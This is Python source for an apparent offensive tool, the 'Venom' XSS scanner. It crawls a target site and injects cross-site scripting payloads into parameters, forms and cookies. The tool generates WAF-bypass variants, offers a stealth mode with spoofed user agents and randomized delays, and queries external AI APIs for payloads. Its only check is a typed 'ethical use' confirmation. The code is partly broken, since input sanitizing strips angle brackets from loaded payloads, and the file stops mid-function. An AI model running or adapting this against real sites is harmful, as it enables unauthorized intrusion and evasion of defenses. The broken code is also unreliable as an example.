#!/usr/bin/env python3
import requests
import sys
import re
import os
import time
import argparse
import threading
import queue
import random
from urllib.parse import urljoin, urlencode, urlparse, parse_qs
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import logging
from typing import Optional, List, Dict
import html
from requests.exceptions import RequestException, SSLError, Timeout
from concurrent.futures import ThreadPoolExecutor
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoAlertPresentException, WebDriverException

# Setup logging
log_file = "venom.log"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(log_file, mode='a', encoding='utf-8'), logging.StreamHandler()]
)
logging.info("Logging initialized successfully")

# Colors
RED, GREEN, YELLOW, RESET, BOLD, WHITE = '\033[91m', '\033[92m', '\033[93m', '\033[0m', '\033[1m', '\033[97m'
ORANGE, BLUE, PURPLE, CYAN = '\033[38;5;208m', '\033[94m', '\033[95m', '\033[96m'

class ThreadSafeCounter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()

    def increment(self):
        with self.lock:
            self.value += 1
            return self.value

    def get(self):
        with self.lock:
            return self.value

def sanitize_input(input_str: str) -> str:
    return re.sub(r'[;&|><`]', '', input_str)

def sanitize_path(path: str) -> str:
    return os.path.abspath(os.path.normpath(path))

def parse_post_file(file_path: str) -> tuple[Optional[str], Dict[str, str], Dict[str, str]]:
    url = None
    headers = {}
    data = {}
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read().strip()
            lines = content.splitlines()
            if lines and lines[0].startswith("POST "):
                url_parts = lines[0].split()
                if len(url_parts) >= 2:
                    url = url_parts[1]
            in_headers = True
            body_start = 0
            for i, line in enumerate(lines[1:], 1):
                if not line.strip():
                    in_headers = False
                    body_start = i + 1
                    break
                if in_headers and ':' in line:
                    key, value = line.split(':', 1)
                    headers[sanitize_input(key.strip())] = sanitize_input(value.strip())
            if not url and 'Host' in headers:
                url = f"http://{headers['Host']}{url or '/'}"
            if body_start > 0 and body_start < len(lines):
                body = '&'.join(lines[body_start:]).strip()
                for pair in body.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        data[sanitize_input(key)] = sanitize_input(value)
            logging.info(f"Parsed POST file: URL={url}, Headers={headers}, Data={data}")
            return url, headers, data
    except Exception as e:
        logging.error(f"Failed to parse POST file {file_path}: {e}")
        return None, {}, {}
    return url, headers, data

def get_banner_and_features() -> str:
    banner = f"""
{BLUE}╔════════════════════════════════════════════════════════════════════╗{RESET}
{BLUE}║{RESET}          {CYAN}██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║█████╗  ██╔██╗ ██║██║   ██╗██╔████╔██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║██╔══╝  ██║╚██╗██║██║   ██╗██║╚██╔╝██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}╚██████╔╝███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}           {CYAN}╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}                                                                    {BLUE}║{RESET}
{BLUE}║{RESET}                  {PURPLE}Venom Advanced XSS Scanner 2025{RESET}                   {BLUE}║{RESET}
{BLUE}║{RESET}                            {WHITE}Version 5.25{RESET}                            {BLUE}║{RESET}
{BLUE}║{RESET}    {GREEN}Made by: YANIV AVISROR | PENETRATION TESTER | ETHICAL HACKER{RESET}    {BLUE}║{RESET}
{BLUE}╚════════════════════════════════════════════════════════════════════╝{RESET}
"""
    features = [
        "Accurate XSS detection with context-aware analysis",
        "Smart session-aware POST/GET scanning with login support",
        "Support for custom POST requests from TXT files ",
        "Dynamic response analysis with similarity checking",
        "Advanced WAF/CSP detection with adaptive bypass strategies",
        "Payloads sourced from local files and GitHub",
        "AI-driven payload optimization (local learning or external API)",
        "Execution verification using headless browser for precision",
        "Real-time progress display with detailed testing feedback",
        "Cookie and session injection testing with new session support"
    ]
    return banner + "\n".join(f"{GREEN}{BOLD}●{RESET} {BOLD}{feature}{RESET}" for feature in features) + "\n"

def parse_args() -> argparse.Namespace:
    banner_and_features = get_banner_and_features()
    description = f"""{banner_and_features}
Venom Advanced XSS Scanner is a professional-grade tool for ethical penetration testers to identify XSS vulnerabilities with high accuracy. This version supports HTTP/HTTPS, smart POST/GET requests, custom POST from TXT files, Cookie/Session testing, and two AI-assisted payload optimization modes:
- Local AI: Learns from past scans to optimize payloads (no API key needed).
- External AI: Uses an external AI platform (requires --ai-key and --ai-platform).

Usage:
  python3 venom.py <url> [options]
Examples:
  python3 venom.py http://example.com --scan-xss --ai-assist  # Local AI optimization
  python3 venom.py http://example.com --scan-xss --ai-assist --ai-key "your-key" --ai-platform "xai-grok" --new-session  # External AI with new session
  python3 venom.py http://example.com --scan-xss -H "Cookie: session=abc123"  # Test with custom cookie
"""
    
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("url", help="Target URL to scan (e.g., http://example.com).")
    parser.add_argument("-w", "--workers", type=int, default=5, help="Number of concurrent threads (default: 5, max: 20).")
    parser.add_argument("--ai-assist", action="store_true", help="Enable AI-driven payload optimization. Uses local learning by default; requires --ai-key and --ai-platform for external AI.")
    parser.add_argument("--ai-key", type=str, default=None, help="API key for external AI platform (e.g., 'your-xai-key'). Required with --ai-platform.")
    parser.add_argument("--ai-platform", type=str, default=None, choices=['xai-grok', 'openai-gpt3', 'google-gemini'],
                        help="External AI platform (e.g., 'xai-grok'). Requires --ai-key; optional with --ai-assist.")
    parser.add_argument("--scan-xss", action="store_true", help="Enable XSS scanning (required).", required=True)
    parser.add_argument("--payloads-dir", default="./payloads/", help="Directory with custom payload files (default: './payloads/').")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP request timeout in seconds (default: 10).")
    parser.add_argument("--verbose", action="store_true", help="Enable detailed logging.")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode: 2 workers, 5-15s delays.")
    parser.add_argument("--min-delay", type=float, help="Min delay between tests (default: 0.1 normal, 5 stealth).")
    parser.add_argument("--max-delay", type=float, help="Max delay between tests (default: 0.5 normal, 15 stealth).")
    parser.add_argument("--full-report", action="store_true", help="Show all vulnerabilities in report.")
    parser.add_argument("-H", action='append', help="Custom HTTP headers (e.g., 'Cookie: session=abc123').")
    parser.add_argument("--method", choices=['get', 'post', 'both'], default='both', help="HTTP method: 'get', 'post', 'both' (default).")
    parser.add_argument("--data", type=str, default=None, help="POST data (e.g., 'key1=value1&key2=value2').")
    parser.add_argument("--post-file", type=str, default=None, help="TXT file with POST request (e.g., 'post.txt').")
    parser.add_argument("--payload-field", type=str, default=None, help="Specific field to inject payloads (e.g., 'email').")
    parser.add_argument("--login-url", type=str, default=None, help="Login URL for session.")
    parser.add_argument("--login-data", type=str, default=None, help="Login credentials (e.g., 'username=admin&password=pass123').")
    parser.add_argument("--verify-execution", action="store_true", help="Verify high-severity payloads with headless browser.")
    parser.add_argument("--new-session", action="store_true", help="Force a new session by clearing cookies before scanning.")

    print(banner_and_features)
    while True:
        response = input(f"{RED}[!] Ethical use only (YES/NO): {RESET}").strip().upper()
        if response == "YES":
            print(f"{GREEN}[+] Ethical use confirmed. Initiating scan...{RESET}")
            break
        elif response == "NO":
            print(f"{RED}[!] This tool is for ethical use only. Exiting.{RESET}")
            sys.exit(0)
        else:
            print(f"{YELLOW}[!] Please enter YES or NO.{RESET}")

    args = parser.parse_args()
    args.payloads_dir = sanitize_path(args.payloads_dir)
    args.workers = min(args.workers, 20)
    if args.stealth:
        args.workers = min(args.workers, 2)
        args.min_delay = args.min_delay if args.min_delay is not None else 5
        args.max_delay = args.max_delay if args.max_delay is not None else 15
        print(f"{GREEN}[+] Stealth mode: Workers {args.workers}, Delays {args.min_delay}-{args.max_delay}s{RESET}")
    else:
        args.min_delay = args.min_delay if args.min_delay is not None else 0.1
        args.max_delay = args.max_delay if args.max_delay is not None else 0.5
    
    if args.post_file:
        post_url, post_headers, post_data = parse_post_file(sanitize_path(args.post_file))
        if post_url and not args.url:
            args.url = post_url
        if not args.url:
            print(f"{RED}[!] No URL provided. Exiting.{RESET}")
            sys.exit(1)
        args.post_headers = post_headers
        args.post_data = post_data if not args.data else dict(pair.split('=', 1) for pair in args.data.split('&'))
        if post_headers:
            args.H = args.H or []
            args.H.extend([f"{k}: {v}" for k, v in post_headers.items()])
        print(f"{GREEN}[+] Loaded POST request from {args.post_file}{RESET}")
    
    if args.ai_platform and not args.ai_key:
        print(f"{RED}[!] --ai-platform requires --ai-key. Exiting.{RESET}")
        sys.exit(1)
    if args.login_url and not args.login_data:
        print(f"{RED}[!] --login-url requires --login-data. Exiting.{RESET}")
        sys.exit(1)
    
    command = " ".join(sys.argv)
    print(f"{GREEN}[+] Command: {command}{RESET}")
    return args

def fetch_payloads_from_github(timeout: int) -> List[str]:
    payloads = []
    headers = {'User-Agent': 'Venom-XSS-Scanner/5.25'}
    session = requests.Session()
    session.mount('https://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2)))
    github_urls = [
        "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt",
    ]
    for url in github_urls:
        try:
            response = session.get(url, headers=headers, timeout=timeout, verify=True)
            response.raise_for_status()
            payloads.extend([sanitize_input(p.strip()) for p in response.text.splitlines() if p.strip() and '<' in p])
            logging.info(f"Fetched {len(payloads)} payloads from {url}")
            break
        except RequestException as e:
            logging.error(f"Failed to fetch payloads from {url}: {e}")
    return payloads

class PayloadGenerator:
    def __init__(self, payloads_dir: str, bypass_needed: bool = False, use_403_bypass: bool = False, stealth: bool = False):
        self.payloads_dir = payloads_dir
        self.bypass_needed = bypass_needed
        self.use_403_bypass = use_403_bypass
        self.stealth = stealth
        self.payloads = self.load_payloads()
        self.previous_success = []

    def load_payloads(self) -> List[str]:
        default_payloads = [
            "<script>alert('venom')</script>",
            "<img src=x onerror=alert('venom')>",
            "<svg onload=alert('venom')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<input onfocus=alert(1) autofocus>",
            "<div onmouseover=alert(1)>test</div>"
        ]
        stealth_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
        ]
        
        payloads = []
        if not os.path.exists(self.payloads_dir):
            logging.warning(f"Payloads dir {self.payloads_dir} not found; using defaults.")
            return stealth_payloads if self.stealth else default_payloads

        category_map = {
            'waf_bypass': 'waf_bypass.txt',
            '403bypass': '403bypass.txt',
            'default': ['advanced_xss.txt', 'xss_payloads.txt', 'basic_xss.txt']
        }

        selected_category = 'waf_bypass' if self.bypass_needed else '403bypass' if self.use_403_bypass else 'default'
        all_files = [f for f in os.listdir(self.payloads_dir) if f.endswith('.txt')]
        if not all_files:
            return stealth_payloads if self.stealth else default_payloads

        if selected_category == 'default':
            for filename in category_map['default']:
                file_path = os.path.join(self.payloads_dir, filename)
                if os.path.exists(file_path):
                    with open(file_path, 'r', encoding='utf-8') as f:
                        payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                    logging.info(f"Loaded payloads from {file_path}")
        else:
            file_path = os.path.join(self.payloads_dir, category_map[selected_category])
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                logging.info(f"Loaded {selected_category} payloads from {file_path}")

        if not self.stealth:
            payloads.extend(fetch_payloads_from_github(15))
        
        return list(set(payloads)) if payloads else (stealth_payloads if self.stealth else default_payloads)

    def optimize_payloads(self, response_text: str, active_params: List[str]) -> List[str]:
        html_context = '<input' in response_text or '<form' in response_text
        js_context = '<script' in response_text or 'javascript:' in response_text
        optimized = []
        for payload in self.payloads:
            if any(success in payload for success in self.previous_success):
                optimized.append(payload)
            elif html_context and ('on' in payload.lower() or 'src=' in payload.lower()):
                optimized.append(payload)
            elif js_context and ('alert(' in payload.lower() or 'javascript:' in payload.lower()):
                optimized.append(payload)
            elif 'alert(' in payload.lower():
                optimized.append(payload)
        return optimized if optimized else self.payloads

    def generate_waf_bypass_payloads(self, base_payload: str) -> List[str]:
        return [
            base_payload.upper(),
            base_payload.replace('<', '%3C').replace('>', '%3E'),
            f"{base_payload[:5]}/*comment*/{base_payload[5:]}",
            base_payload.replace('alert', 'a\u006cert')
        ]

    def generate(self) -> List[str]:
        return self.payloads

    def update_success(self, payload: str):
        self.previous_success.append(payload)

class AIAssistant:
    def __init__(self, payloads: List[str], api_key: Optional[str] = None, platform: Optional[str] = None):
        self.payloads = payloads
        self.api_key = api_key
        self.platform = platform
        self.api_endpoint = self.get_api_endpoint() if platform else None
        self.success_history: Dict[str, dict] = {}
        self.lock = threading.Lock()
        if self.api_key and self.api_endpoint:
            logging.info(f"AI assistance enabled with external platform: {platform}, endpoint: {self.api_endpoint}")
        else:
            logging.info("AI assistance enabled with local learning (no external API)")

    def get_api_endpoint(self) -> str:
        endpoints = {
            "xai-grok": "https://api.xai.com/v1/completions",
            "openai-gpt3": "https://api.openai.com/v1/completions",
            "google-gemini": "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"
        }
        return endpoints.get(self.platform, "https://api.xai.com/v1/completions")

    def suggest_payloads(self, response: Optional[str] = None, initial_run: bool = False, status_code: int = 200) -> List[str]:
        executable_payloads = [p for p in self.payloads if 'alert(' in p.lower() or 'on' in p.lower()]
        other_payloads = [p for p in self.payloads if p not in executable_payloads]
        
        if status_code == 404 or "timed out" in str(response).lower():
            executable_payloads = sorted(executable_payloads, key=len)[:10]
        
        if self.api_key and self.api_endpoint and response:  # External AI mode
            ai_suggestions = self.get_ai_suggestions(response)
            executable_payloads.extend(ai_suggestions)
            logging.info(f"External AI enhanced payloads added: {len(ai_suggestions)}")
        elif response:  # Local AI mode (learning from past scans)
            with self.lock:
                sorted_payloads = sorted(
                    executable_payloads,
                    key=lambda p: self.success_history.get(p, {"weight": 0.0})["weight"],
                    reverse=True
                )
            html_context = '<input' in response or '<form' in response
            js_context = '<script' in response or 'javascript:' in response
            optimized = [p for p in sorted_payloads if (html_context and 'on' in p.lower()) or (js_context and 'alert(' in p.lower())]
            executable_payloads = optimized if optimized else sorted_payloads[:20]
            logging.info(f"Local AI optimized payloads: {len(executable_payloads)} selected")
        
        return list(set(executable_payloads + other_payloads[:20]))

    def get_ai_suggestions(self, response: str) -> List[str]:
        try:
            headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
            if self.platform == "google-gemini":
                data = {
                    "contents": [{"parts": [{"text": f"Suggest optimized XSS payloads for this response:\n{response[:500]}"}]}],
                    "generationConfig": {"maxOutputTokens": 50}
                }
            else:
                data = {
                    "prompt": f"Suggest optimized XSS payloads for this web response:\n{response[:500]}",
                    "max_tokens": 50,
                    "model": "grok" if self.platform == "xai-grok" else "text-davinci-003"
                }
            ai_response = requests.post(self.api_endpoint, json=data, headers=headers, timeout=10, verify=True)
            ai_response.raise_for_status()
            if self.platform == "google-gemini":
                suggestions = ai_response.json().get("candidates", [{}])[0].get("content", {}).get("parts", [{}])[0].get("text", "").splitlines()
            else:
                suggestions = ai_response.json().get("choices", [{}])[0].get("text", "").splitlines()
            return [sanitize_input(s.strip()) for s in suggestions if s.strip() and '<' in s]
        except RequestException as e:
            logging.error(f"AI API call failed for {self.platform}: {e}")
            return []

    def record_success(self, payload: str, context: str = "unknown", status_code: int = 200) -> None:
        with self.lock:
            if payload not in self.success_history:
                self.success_history[payload] = {"success_count": 0, "weight": 0.0, "context": context}
            if status_code == 200:
                self.success_history[payload]["success_count"] += 1
                self.success_history[payload]["weight"] = min(1.0, self.success_history[payload]["weight"] + 0.2)

class Venom:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.session = requests.Session()
        self.session.mount('http://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2), pool_maxsize=200))
        self.session.mount('https://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2), pool_maxsize=200))
        self.session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.google.com/'
        })

        self.update_headers(args.H)
        self.post_data = args.post_data if hasattr(args, 'post_data') else {}
        if args.data:
            self.post_data.update(dict(pair.split('=', 1) for pair in args.data.split('&')))

        if args.new_session:
            self.session.cookies.clear()
            logging.info("New session created by clearing cookies")
        elif args.login_url and args.login_data:
            self.establish_session(args.login_url, args.login_data)

        self.task_queue = queue.Queue()
        self.lock = threading.Lock()
        self.vulnerabilities = []
        self.visited_urls = set()
        self.total_tests = ThreadSafeCounter()
        self.total_payloads = 0
        self.current_payload = "Initializing..."
        self.current_param = "None"
        self.current_cookie = "None"
        self.start_time = time.time()
        self.running = True
        self.domain = urlparse(args.url).netloc
        self.waf_csp_status = "Unknown"
        self.bypass_performed = False
        self.use_403_bypass = False
        self.is_waf_detected = False
        self.active_params = []

        self.initial_waf_csp_check()
        self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, self.args.stealth)
        self.payloads = self.payload_generator.generate()
        self.total_payloads = len(self.payloads)
        self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key, self.args.ai_platform) if self.args.ai_assist else None
        print(f"{GREEN}[+] AI Assistance: {'Enabled (Local Learning)' if self.ai_assistant and not self.args.ai_key else 'Enabled (External API)' if self.ai_assistant else 'Disabled'}{RESET}")

    def update_headers(self, headers: List[str]) -> None:
        if not headers:
            return
        for header in headers:
            try:
                key, value = header.split(':', 1)
                self.session.headers.update({sanitize_input(key.strip()): sanitize_input(value.strip())})
                if key.strip().lower() == 'cookie':
                    logging.info(f"Custom Cookie added: {value.strip()}")
            except ValueError:
                logging.warning(f"Invalid header: {header}")

    def establish_session(self, login_url: str, login_data: str) -> bool:
        login_dict = dict(pair.split('=', 1) for pair in login_data.split('&'))
        try:
            response = self.session.post(login_url, data=login_dict, timeout=self.args.timeout, verify=True)
            if response.status_code in [200, 302]:
                logging.info(f"Login successful to {login_url}. Cookies: {dict(self.session.cookies)}")
                return True
            logging.warning(f"Login failed: Status {response.status_code}")
            return False
        except RequestException as e:
            logging.error(f"Login failed: {e}")
            return False

    def initial_waf_csp_check(self) -> None:
        try:
            test_payload = "<script>alert('waf_test')</script>"
            response = self.session.get(self.args.url + "?test=" + test_payload, timeout=self.args.timeout, verify=True)
            headers = response.headers
            waf_indicators = {'cloudflare': 'cf-ray', 'akamai': 'akamai', 'sucuri': 'sucuri', 'mod_security': 'mod_security'}
            for tech, indicator in waf_indicators.items():
                if indicator.lower() in str(headers).lower() or tech.lower() in response.text.lower():
                    self.waf_csp_status = f"WAF detected ({tech})"
                    self.is_waf_detected = True
                    break
            if 'blocked' in response.text.lower() or response.status_code == 403:
                self.waf_csp_status = "WAF detected (behavioral)"
                self.is_waf_detected = True
            if not self.is_waf_detected and headers.get('Content-Security-Policy'):
                self.waf_csp_status = "CSP detected"
                self.is_waf_detected = True
            if not self.is_waf_detected:
                self.waf_csp_status = "No WAF/CSP detected"
            logging.info(f"WAF/CSP status: {self.waf_csp_status}")
        except RequestException as e:
            self.waf_csp_status = "Check failed"
            logging.error(f"WAF/CSP check failed: {e}")

    def check_connection(self, url: str) -> bool:
        try:
            response = self.session.get(url, timeout=self.args.timeout, verify=True)
            return response.status_code < 400 or response.status_code in [403, 404]
        except RequestException:
            return False

    def identify_active_params(self, url: str, soup: BeautifulSoup, method: str) -> List[str]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        param_keys = list(params.keys())
        additional_params = ['q', 'search', 'query', 'id', 'page', 'email']
        for param in additional_params:
            if param not in param_keys:
                param_keys.append(param)
        for tag in soup.find_all(['input', 'textarea', 'select']):
            name = tag.get('name') or tag.get('id')
            if name and name not in param_keys:
                param_keys.append(name)
        if method == 'post' and self.post_data:
            param_keys.extend(self.post_data.keys())
        return param_keys

    def extract_cookies(self) -> Dict[str, str]:
        cookies = dict(self.session.cookies)
        if 'Cookie' in self.session.headers:
            for cookie in self.session.headers['Cookie'].split(';'):
                if '=' in cookie:
                    key, value = cookie.split('=', 1)
                    cookies[sanitize_input(key.strip())] = sanitize_input(value.strip())
        return cookies

    def verify_execution(self, url: str) -> bool:
        if not self.args.verify_execution:
            return False
        options = Options()
        options.headless = True
        try:
            driver = webdriver.Chrome(options=options)
            driver.get(url)
            alert = driver.switch_to.alert
            alert.accept()
            logging.info(f"Execution verified for {url}")
            return True
        except (NoAlertPresentException, WebDriverException):
            return False
        finally:
            driver.quit()

    def scan(self) -> None:
        logging.info(f"Starting scan on {self.args.url}")
        print(f"{GREEN}[+] Initiating XSS Scan on {CYAN}{self.args.url}{RESET}")
        if not self.check_connection(self.args.url):
            print(f"{RED}[!] URL not suitable. Aborting.{RESET}")
            self.report()
            return
        self.crawl(self.args.url)
        
        with ThreadPoolExecutor(max_workers=self.args.workers) as executor:
            while not self.task_queue.empty() and self.running:
                try:
                    task = self.task_queue.get(timeout=15)
                    future = executor.submit(task)
                    response = future.result()
                    if response and response.status_code == 429:
                        self.args.workers = max(1, self.args.workers - 1)
                        executor._max_workers = self.args.workers
                        print(f"{YELLOW}[!] Rate limit detected, workers reduced to {self.args.workers}{RESET}")
                    delay = random.uniform(self.args.min_delay, self.args.max_delay)
                    time.sleep(delay)
                except queue.Empty:
                    break
                except Exception as e:
                    logging.error(f"Thread failed: {e}")
        
        self.running = False
        self._display_status(final=True)
        self.report()

    def crawl(self, url: str, depth: int = 0, max_depth: int = 3) -> None:
        with self.lock:
            if url in self.visited_urls or depth > max_depth or urlparse(url).netloc != self.domain:
                return
            self.visited_urls.add(url)
        try:
            response = self.session.get(url, timeout=self.args.timeout, verify=True)
            soup = BeautifulSoup(response.text, 'html.parser')
            payloads = self.payload_generator.optimize_payloads(response.text, self.active_params)
            if self.ai_assistant:
                payloads = self.ai_assistant.suggest_payloads(response.text, initial_run=(depth == 0), status_code=response.status_code)
            
            if self.args.method in ['get', 'both']:
                self.test_injection_points(url, response, soup, payloads, 'get')
            if self.args.method in ['post', 'both']:
                self.test_injection_points(url, response, soup, payloads, 'post')
            self.test_cookies(url, payloads, response.text)
            
            for form in soup.find_all('form'):
                action = urljoin(url, form.get('action', ''))
                if urlparse(action).netloc == self.domain:
                    self.task_queue.put(lambda f=form, a=action, p=payloads: self.test_form(a, f, p))
        except RequestException as e:
            logging.error(f"Crawl failed for {url}: {e}")

    def test_injection_points(self, url: str, response: requests.Response, soup: BeautifulSoup, payloads: List[str], method: str) -> None:
        active_params = self.identify_active_params(url, soup, method)
        logging.info(f"Testing {method.upper()} with params: {active_params} on {url}")
        base_url = url.split('?', 1)[0]
        base_response = response.text
        
        for param in active_params:
            for payload in payloads:
                self.current_param = param
                self.test_request(base_url, {param: payload}, payload, method, f"Query String ({param})", base_response)

    def test_form(self, action: str, form: BeautifulSoup, payloads: List[str]) -> None:
        inputs = {inp.get('name'): inp.get('value', '') for inp in form.find_all(['input', 'textarea', 'select']) if inp.get('name')}
        if not inputs:
            inputs = {tag.get('id') or f"unnamed_{i}": '' for i, tag in enumerate(form.find_all(['input', 'textarea', 'select']))}
        if self.post_data:
            inputs.update(self.post_data)
        try:
            base_response = self.session.post(action, data=inputs, timeout=self.args.timeout, verify=True).text
        except RequestException:
            base_response = ""
        
        for name in inputs:
            for payload in payloads:
                self.current_param = name
                test_params = inputs.copy()
                test_params[name] = payload
                self.test_request(action, test_params, payload, 'post', f"Form Field ({name})", base_response)

    def test_cookies(self, url: str, payloads: List[str], base_response: str) -> None:
        cookies = self.extract_cookies()
        if not cookies:
            return
        logging.info(f"Testing cookies: {list(cookies.keys())} on {url}")
        original_headers = self.session.headers.copy()
        for cookie_name, cookie_value in cookies.items():
            for payload in payloads:
                self.current_param = f"Cookie: {cookie_name}"
                self.current_cookie = f"{cookie_name}={payload}"
                cookie_str = '; '.join([f"{k}={v if k != cookie_name else payload}" for k, v in cookies.items()])
                self.session.headers['Cookie'] = cookie_str
                self.test_request(url, {}, payload, 'get', f"Cookie ({cookie_name})", base_response)
        self.session.headers = original_headers  # Restore original headers

    def test_request(self, url: str, params: dict, payload: str, method: str, injection_point: str, 
                    base_response: str) -> Optional[requests.Response]:
        retry_attempts = 3
        for attempt in range(retry_attempts):
            try:
                self.total_tests.increment()
                self.current_payload = payload[:50] + "..." if len(payload) > 50 else payload
                self._display_status()
                data = self.post_data.copy() if method == 'post' else None
                if method == 'post':
                    data.update(params)
                resp = self.session.request(
                    method, url,
                    params=params if method == 'get' else None,
                    data=data if method == 'post' else None,
                    timeout=self.args.timeout,
                    verify=True
                )
                response_text = html.unescape(resp.text.lower())
                
                reflected = payload.lower() in response_text
                sanitized = html.escape(payload.lower()) in response_text
                
                if not reflected or sanitized:
                    continue
                
                soup = BeautifulSoup(resp.text, 'html.parser')
                in_executable_context = False
                for tag in soup.find_all(True):
                    tag_str = str(tag).lower()
                    if payload.lower() in tag_str and any(attr.startswith('on') or attr in ['src', 'href'] for attr in tag.attrs):
                        in_executable_context = True
                        break
                
                similarity = self.check_similarity(base_response, resp.text)
                if similarity > 0.95:
                    continue
                
                full_url = url + ('?' + urlencode(params) if method == 'get' else '')
                executed = self.verify_execution(full_url) if in_executable_context and self.args.verify_execution else in_executable_context
                if reflected:
                    severity = "High" if executed else "Medium" if in_executable_context else "Low"
                    self.report_vulnerability(full_url, payload, params, f"{injection_point} XSS (Executable, Severity: {severity})", executed)
                    if self.ai_assistant and executed:
                        self.ai_assistant.record_success(payload, "html" if '<' in resp.text else "js")
                    self.payload_generator.update_success(payload)
                return resp
            except RequestException as e:
                logging.warning(f"Request failed: {e} (Attempt {attempt+1})")
                time.sleep(2 ** attempt)
        return None

    def check_similarity(self, base_response: str, test_response: str) -> float:
        try:
            vectorizer = TfidfVectorizer()
            tfidf = vectorizer.fit_transform([base_response, test_response])
            return cosine_similarity(tfidf[0:1], tfidf[1:2])[0][0]
        except Exception:
            return 0.0

    def _display_status(self, final: bool = False) -> None:
        elapsed = int(time.time() - self.start_time)
        progress = min((self.total_tests.get() / self.total_payloads * 100) if self.total_payloads else 0, 100.0)
        status = f"{BLUE}╔════ Scan Progress ═════╗{RESET}\n" \
                 f"{BLUE}║{RESET} {CYAN}Progress:{RESET} {WHITE}{progress:.1f}%{RESET} {CYAN}Tests:{RESET} {WHITE}{self.total_tests.get()}/{self.total_payloads}{RESET}\n" \
                 f"{BLUE}║{RESET} {CYAN}Vulns:{RESET} {RED}{len(self.vulnerabilities)}{RESET} {CYAN}Time:{RESET} {WHITE}{elapsed}s{RESET}\n" \
                 f"{BLUE}║{RESET} {CYAN}Current Param:{RESET} {YELLOW}{self.current_param}{RESET}\n" \
                 f"{BLUE}║{RESET} {CYAN}Current Cookie:{RESET} {ORANGE}{self.current_cookie}{RESET}\n" \
                 f"{BLUE}║{RESET} {CYAN}Current Payload:{RESET} {ORANGE}{self.current_payload}{RESET}\n" \
                 f"{BLUE}╚════════════════════════╝{RESET}"
        if final:
            print(status)
        else:
            sys.stdout.write(f"\033[6A\033[2K{status}\033[0m")
            sys.stdout.flush()

    def report_vulnerability(self, url: str, payload: str, params: dict, vuln_type: str, popup: bool) -> None:
        with self.lock:
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
            vuln = {
                'url': url,
                'payload': payload,
                'type': vuln_type,
                'timestamp': timestamp,
                'executed': popup,
                'context': 'JavaScript' if 'script' in payload.lower() else 'HTML',
                'waf_status': self.waf_csp_status,
                'bypass': "Yes" if self.bypass_performed or self.use_403_bypass else "No",
                'params': params,
                'cookies': dict(self.session.cookies),
                'method': self.args.method if self.args.method != 'both' else 'post' if 'Form' in vuln_type else 'get'
            }
            if vuln in self.vulnerabilities:
                return
            self.vulnerabilities.append(vuln)

            severity = vuln_type.split("Severity: ")[1].split(")")[0]
            severity_color = GREEN if "Low" in severity else ORANGE if "Medium" in severity else RED
            output = f"{RED}╔════════════════════════════════════════════════════╗{RESET}\n" \
                     f"{RED}║{RESET} {RED}XSS DETECTED [{timestamp}]{RESET} {RED}║{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Type:{RESET} {CYAN}{vuln_type.split('Severity:')[0]}{RESET}{WHITE}Severity:{RESET} {severity_color}{severity}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}URL:{RESET} {GREEN}{url}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Payload:{RESET} {ORANGE}{payload}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Context:{RESET} {PURPLE}{vuln['context']}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Executed:{RESET} {GREEN}{'Yes' if popup else 'No'}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Cookies:{RESET} {YELLOW}{vuln['cookies']}{RESET}\n" \
